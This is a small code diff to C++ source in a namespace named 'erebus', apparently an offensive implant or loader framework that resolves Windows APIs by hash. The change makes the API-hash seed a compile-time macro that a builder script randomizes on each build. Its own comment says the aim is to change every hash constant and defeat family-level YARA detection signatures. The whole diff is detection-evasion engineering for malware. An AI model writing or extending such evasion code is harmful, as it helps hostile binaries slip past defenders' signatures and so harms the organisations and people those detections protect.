@@ -2367,9 +2367,17 @@ namespace erebus {
 	//
 	PPEB GetPEB(void);
 
+	// Per-build hash seed. The default matches the historical literal so
+	// existing builds hash identically, but builder.py passes a fresh
+	// randomized value via -DEREBUS_HASH_SEED=0x.... on every compile.
+	// Changing this constant changes every API-hash value in the binary,
+	// defeating family-level YARA that pins on fixed hash constants.
+	#ifndef EREBUS_HASH_SEED
+	#define EREBUS_HASH_SEED 0x6A6CCC06
+	#endif
 	constexpr ULONG RandomHashSeed()
 	{
-		ULONG Seed = 0x6A6CCC06;
+		ULONG Seed = EREBUS_HASH_SEED;
 
 		Seed = (Seed * 0x25EDE3FB) ^ (Seed >> 16);
 		return Seed;
